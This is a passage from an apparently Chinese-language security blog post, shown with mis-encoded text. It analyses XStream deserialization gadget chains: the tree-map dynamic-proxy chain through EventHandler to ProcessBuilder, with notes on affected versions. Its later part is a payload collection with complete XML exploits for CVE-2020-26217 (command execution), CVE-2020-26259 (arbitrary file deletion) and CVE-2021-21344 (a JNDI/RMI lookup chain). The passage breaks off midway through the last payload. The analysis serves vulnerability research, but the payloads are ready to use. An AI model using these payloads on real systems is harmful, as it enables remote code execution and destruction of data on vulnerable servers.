alt="image-20241106110155902"></p><p>è·å–åˆ°typeä¹‹åï¼Œå°±å»è°ƒç”¨convertAnotheræ–¹æ³•ï¼Œå’Œå‰é¢ä¸€æ ·å»æ‰¾ç±»å‹è½¬æ¢å™¨</p><p><img src="https://cdn.clown2024.cn/image-20241106110438659.png" alt="image-20241106110438659"></p><p>ä¹‹åä¹Ÿæ˜¯å·®ä¸å¤šçš„æµç¨‹ï¼Œä¸€ç›´åˆ°ä¸‹é¢è¿™ä¸ªå…³é”®çš„åœ°æ–¹ï¼Œcom.thoughtworks.xstream.converters.extended.DynamicProxyConverter#unmarshalæ–¹æ³•å†…éƒ¨</p><p><img src="https://cdn.clown2024.cn/image-20241106110843531.png" alt="image-20241106110843531"></p><p>è¿™é‡ŒæŒ‰æ ‡ç­¾å†…å®¹ç”Ÿæˆå¯¹åº”æ¥å£çš„åŠ¨æ€ä»£ç†ï¼Œæ­¤æ—¶è¿™ä¸ªDUMMYæ˜¯ä¸€ä¸ªç©ºçš„ä»£ç†å®ç°</p><p><img src="https://cdn.clown2024.cn/image-20241106113729142.png" alt="image-20241106113729142"></p><p>ç»§ç»­å¾€ä¸‹æ‰§è¡Œhandler &#x3D; (InvocationHandler)context.convertAnother(proxy, handlerType);</p><p><img src="https://cdn.clown2024.cn/image-20241106113843979.png" alt="image-20241106113843979"></p><p>ç„¶ååˆæ˜¯è°ƒç”¨ç›¸å…³è½¬æ¢å™¨æœ€ç»ˆå¾—åˆ°EventHandler</p><p><img src="https://cdn.clown2024.cn/image-20241106114015121.png" alt="image-20241106114015121"></p><p>ç„¶ååé¢åˆæ˜¯å¾ªç¯å¾—è¯»å–æ ‡ç­¾è·å–å¯¹åº”å¾—ç±»å’Œå†…å®¹</p><p>å›åˆ°å‰é¢è·å–handlerçš„åœ°æ–¹ï¼Œå†å¾€ä¸‹å°±æ˜¯æ›¿æ¢ä»£ç†</p><p><img src="https://cdn.clown2024.cn/image-20241106114840135.png" alt="image-20241106114840135"></p><p>ç„¶åå†å›åˆ°å‰é¢çš„TreeMapConverter#populateTreeMapï¼Œè¿™é‡Œä¼šæŠŠç»“æœæŠŠå­˜åˆ°result</p><p><img src="https://cdn.clown2024.cn/image-20241106115157218.png" alt="image-20241106115157218"></p><p>è¿™é‡Œçš„resultå°±æ˜¯TreeMapï¼Œç„¶åé‡Œé¢å°±ä¼šè§¦å‘æˆ‘ä»¬çš„åŠ¨æ€ä»£ç†æ–¹æ³•äº†</p><p>å› ä¸ºæˆ‘ä»¬çš„xmlé…ç½®ä»£ç†çš„æ¥å£æ˜¯Comparableï¼Œç„¶åTreeMapåœ¨è°ƒç”¨putAllæ–¹æ³•çš„æ—¶å€™ï¼Œä¼šè°ƒç”¨åˆ°putæ–¹æ³•ï¼Œè€Œé‡Œé¢è°ƒç”¨äº†compareæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241106121046532.png" alt="image-20241106121046532"></p><p>æœ€ç»ˆå°±ä¼šèµ°åˆ°EventHandler#invokeInternalæ–¹æ³•é‡Œé¢ï¼Œç„¶ååå°„è°ƒç”¨ProcessBuilderçš„startæ–¹æ³•è§¦å‘å‘½ä»¤æ‰§è¡Œ</p><p><img src="https://cdn.clown2024.cn/image-20241106121145638.png" alt="image-20241106121145638"></p><h3 id="å…¶ä»–è¯´æ˜"><a href="#å…¶ä»–è¯´æ˜" class="headerlink" title="å…¶ä»–è¯´æ˜"></a>å…¶ä»–è¯´æ˜</h3><p>åœ¨å°äºç­‰äº1.3.1ç‰ˆæœ¬ï¼Œè¿è¡ŒæŠ¥é”™æ˜¾ç¤ºTreeMapæ²¡æœ‰åŒ…å«comparatorå…ƒç´ ï¼Œå³ä¸æ”¯æŒPoCä¸­ä¸¤ä¸ªå­æ ‡ç­¾å…ƒç´ è°ƒç”¨compareTo()è¿›è¡Œæ¯”è¾ƒï¼Œå› æ­¤æ— æ³•åˆ©ç”¨</p><p><strong>1.4.1-1.4.4æ— æ³•è§¦å‘çš„åŸå› </strong></p><p>åœ¨TreeSetConverter.unmarshal()ä¸­ï¼Œåªæœ‰å½“sortedMapFieldå’ŒtreeMapä¸ä¸ºnullæ—¶ï¼Œæ‰èƒ½è¿›å…¥populateTreeMap()</p><p><img src="https://cdn.clown2024.cn/image-20241106122009384.png" alt="image-20241106122009384"></p><p>è€Œ1.4.1-1.4.4ç‰ˆæœ¬ä¸­ï¼ŒsortedMapFieldé»˜è®¤ä¸ºnull</p><p><img src="https://cdn.clown2024.cn/image-20241106122129571.png" alt="image-20241106122129571"></p><p><strong>1.4.7-1.4.9æ— æ³•è§¦å‘çš„åŸå› </strong></p><p>ReflectionConverter.canConvert()å‡½æ•°ä¸­æ·»åŠ äº†å¯¹EventHandlerç±»çš„è¿‡æ»¤</p><h2 id="tree-map"><a href="#tree-map" class="headerlink" title="tree-map"></a>tree-map</h2><h3 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬-1" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h3><p>ç‰ˆæœ¬&lt;&#x3D;1.4.6æˆ–&#x3D;1.4.10</p><p>payload</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">tree-map</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">entry</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dynamic-proxy</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interface</span>&gt;</span>java.lang.Comparable<span class="hljs-tag">&lt;/<span class="hljs-name">interface</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">handler</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.beans.EventHandler&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">target</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">command</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>calc<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">command</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">target</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">action</span>&gt;</span>start<span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">handler</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dynamic-proxy</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>good<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tree-map</span>&gt;</span><br><br></code></pre></td></tr></table></figure><h3 id="æµç¨‹è¯´æ˜"><a href="#æµç¨‹è¯´æ˜" class="headerlink" title="æµç¨‹è¯´æ˜"></a>æµç¨‹è¯´æ˜</h3><p>è¿™é‡Œå…¶å®å°±å’Œsortedçš„è¿‡ç¨‹æ˜¯å·®ä¸å¤šçš„ï¼Œå°±ä¸åšè¿‡å¤šçš„åˆ†æäº†</p><p>ä»–å’Œsorted-setçš„åŒºåˆ«å°±æ˜¯åœ¨TreeMapConverter#unmarshalçš„åœ°æ–¹</p><p><img src="https://cdn.clown2024.cn/image-20241106141841502.png" alt="image-20241106141841502"></p><p>å¯ä»¥çœ‹åˆ°æ²¡æœ‰TreeSetConverteré‚£ä¹ˆå¤šçš„é™åˆ¶</p><p>ä¸»è¦è¿˜æ˜¯è®°ä¸€ä¸‹payloadä»¥åŠä½¿ç”¨ç‰ˆæœ¬ï¼Œä»¥åŠåé¢ä¹Ÿæ˜¯åªæ”¶é›†ä¸€äº›CVEçš„payload</p><h3 id="å…¶ä»–è¯´æ˜"><a href="#å…¶ä»–è¯´æ˜-1" class="headerlink" title="å…¶ä»–è¯´æ˜"></a>å…¶ä»–è¯´æ˜</h3><p><strong>åœ¨&lt;&#x3D;1.3.1ç‰ˆæœ¬</strong></p><p>ä¼šæŠ¥é”™æ˜¾ç¤ºTreeMapæ²¡æœ‰åŒ…å«comparatorå…ƒç´ ï¼Œå³ä¸æ”¯æŒPoCä¸­ä¸¤ä¸ªå­æ ‡ç­¾å…ƒç´ è°ƒç”¨compareTo()è¿›è¡Œæ¯”è¾ƒï¼Œå› æ­¤æ— æ³•åˆ©ç”¨ï¼Œä¸sorted-setåŸå› ä¸€æ ·</p><p><strong>1.4.7-1.4.9ç‰ˆæœ¬</strong></p><p>ReflectionConverter.canConvert()å‡½æ•°ä¸­æ·»åŠ äº†å¯¹EventHandlerç±»çš„è¿‡æ»¤</p><h1 id="payloadæ”¶é›†"><a href="#payloadæ”¶é›†" class="headerlink" title="payloadæ”¶é›†"></a>payloadæ”¶é›†</h1><h2 id="cve-2020-26217è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"><a href="#CVE-2020-26217è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´" class="headerlink" title="CVE-2020-26217è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"></a>CVE-2020-26217è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</h2><p>å½±å“ç‰ˆæœ¬&lt;&#x3D;1.4.13</p><p>poc</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">map</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">entry</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">flags</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">flags</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">dataHandler</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">contentType</span>&gt;</span>text/plain<span class="hljs-tag">&lt;/<span class="hljs-name">contentType</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">is</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;java.io.SequenceInputStream&#x27;</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">e</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">iterator</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;javax.imageio.spi.FilterIterator&#x27;</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;<span class="hljs-name">iter</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;java.util.ArrayList$Itr&#x27;</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">cursor</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">cursor</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">lastRet</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">lastRet</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">expectedModCount</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">expectedModCount</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">outer-class</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">java.lang.ProcessBuilder</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">command</span>&gt;</span><br>                                                    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>calc<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;/<span class="hljs-name">command</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;/<span class="hljs-name">java.lang.ProcessBuilder</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;/<span class="hljs-name">outer-class</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;/<span class="hljs-name">iter</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;<span class="hljs-name">filter</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;javax.imageio.ImageIO$ContainsFilter&#x27;</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">method</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>start<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">parameter-types</span>/&gt;</span><br>                                        <span class="hljs-tag">&lt;/<span class="hljs-name">method</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>start<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;<span class="hljs-name">next</span>/&gt;</span><br>                                <span class="hljs-tag">&lt;/<span class="hljs-name">iterator</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>KEYS<span class="hljs-tag">&lt;/<span class="hljs-name">type</span>&gt;</span><br>                            <span class="hljs-tag">&lt;/<span class="hljs-name">e</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">in</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;java.io.ByteArrayInputStream&#x27;</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">buf</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">buf</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">pos</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">pos</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">mark</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">mark</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">count</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">count</span>&gt;</span><br>                            <span class="hljs-tag">&lt;/<span class="hljs-name">in</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">is</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">consumed</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">consumed</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">transferFlavors</span>/&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">dataHandler</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">dataLen</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">dataLen</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">map</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241106145534172.png" alt="image-20241106145534172"></p><h2 id="cve-2020-26259ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´"><a href="#CVE-2020-26259ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´" class="headerlink" title="CVE-2020-26259ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´"></a>CVE-2020-26259ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´</h2><p>å½±å“ç‰ˆæœ¬&lt;1.4.14</p><p>poc</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">map</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">entry</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">flags</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">flags</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">dataHandler</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">contentType</span>&gt;</span>text/plain<span class="hljs-tag">&lt;/<span class="hljs-name">contentType</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">is</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.util.ReadAllStream$FileStream&#x27;</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">tempFile</span>&gt;</span>test.txt<span class="hljs-tag">&lt;/<span class="hljs-name">tempFile</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">is</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">transferFlavors</span>/&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">dataHandler</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">dataLen</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">dataLen</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">map</span>&gt;</span><br></code></pre></td></tr></table></figure><p>åˆ›å»ºä¸€ä¸ªtxtåœ¨é¡¹ç›®æ ¹ç›®å½•</p><p><img src="https://cdn.clown2024.cn/image-20241106145406896.png" alt="image-20241106145406896"></p><p>ç„¶åæˆåŠŸåˆ é™¤</p><h2 id="cve-2021-21344è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"><a href="#CVE-2021-21344è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´" class="headerlink" title="CVE-2021-21344è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"></a>CVE-2021-21344è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</h2><p>poc</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java.util.PriorityQueue</span> <span class="hljs-attr">serialization</span>=<span class="hljs-string">&#x27;custom&#x27;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">unserializable-parents</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">java.util.PriorityQueue</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">default</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">size</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">size</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">comparator</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">indexMap</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">packet</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">message</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">bridge</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;<span class="hljs-name">bridge</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">bi</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">jaxbType</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="hljs-tag">&lt;/<span class="hljs-name">jaxbType</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">uriProperties</span>/&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">attributeProperties</span>/&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">inheritedAttWildcard</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">getter</span>&gt;</span><br>                                                    <span class="hljs-tag">&lt;<span class="hljs-name">class</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span><br>                                                    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>getDatabaseMetaData<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>                                                    <span class="hljs-tag">&lt;<span class="hljs-name">parameter-types</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;/<span class="hljs-name">getter</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;/<span class="hljs-name">inheritedAttWildcard</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;/<span class="hljs-name">bi</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">tagName</span>/&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">context</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">marshallerPool</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">outer-class</span> <span class="hljs-attr">reference</span>=<span class="hljs-string">&#x27;../..&#x27;</span>/&gt;</span><br>                                            <span class="hljs-tag">&lt;/<span class="hljs-name">marshallerPool</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">nameList</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">nsUriCannotBeDefaulted</span>&gt;</span><br>                                                    <span class="hljs-tag">&lt;<span class="hljs-name">boolean</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">boolean</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;/<span class="hljs-name">nsUriCannotBeDefaulted</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">namespaceURIs</span>&gt;</span><br>                                                    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;/<span class="hljs-name">namespaceURIs</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">localNames</span>&gt;</span><br>                                                    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;/<span class="hljs-name">localNames</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;/<span class="hljs-name">nameList</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;/<span class="hljs-name">context</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;/<span class="hljs-name">bridge</span>&gt;</span><br>                                <span class="hljs-tag">&lt;/<span class="hljs-name">bridge</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">jaxbObject</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span> <span class="hljs-attr">serialization</span>=<span class="hljs-string">&#x27;custom&#x27;</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;<span class="hljs-name">javax.sql.rowset.BaseRowSet</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">default</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">concurrency</span>&gt;</span>1008<span class="hljs-tag">&lt;/<span class="hljs-name">concurrency</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">escapeProcessing</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">escapeProcessing</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">fetchDir</span>&gt;</span>1000<span class="hljs-tag">&lt;/<span class="hljs-name">fetchDir</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">fetchSize</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">fetchSize</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">isolation</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">isolation</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">maxFieldSize</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">maxFieldSize</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">maxRows</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">maxRows</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">queryTimeout</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">queryTimeout</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">readOnly</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">readOnly</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">rowSetType</span>&gt;</span>1004<span class="hljs-tag">&lt;/<span class="hljs-name">rowSetType</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">showDeleted</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">showDeleted</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span>&gt;</span>rmi://127.0.0.1:1099/exp<span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">params</span>/&gt;</span><br>                                        <span class="hljs-tag">&lt;/<span class="hljs-name">default</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;/<span class="hljs-name">javax.sql.rowset.BaseRowSet</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;<span class="hljs-name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">default</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">iMatchColumns</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span 